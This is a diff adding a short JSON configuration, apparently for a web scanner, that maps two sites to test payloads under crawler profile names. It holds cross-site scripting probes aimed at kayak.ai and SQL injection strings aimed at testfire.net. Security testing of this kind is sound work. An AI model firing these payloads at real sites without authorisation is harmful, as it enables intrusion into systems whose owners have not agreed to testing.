@@ -1,0 +1,10 @@
+{
+  "kayak.ai": [
+    {"payload": "<script>alert(1)</script>", "profile": "GhostCrawl"},
+    {"payload": "<svg/onload=alert(1)>", "profile": "GhostCrawl"}
+  ],
+  "testfire.net": [
+    {"payload": "' OR '1'='1", "profile": "DefaultHuman"},
+    {"payload": "' UNION SELECT 1,2,3--", "profile": "DefaultHuman"}
+  ]
+}
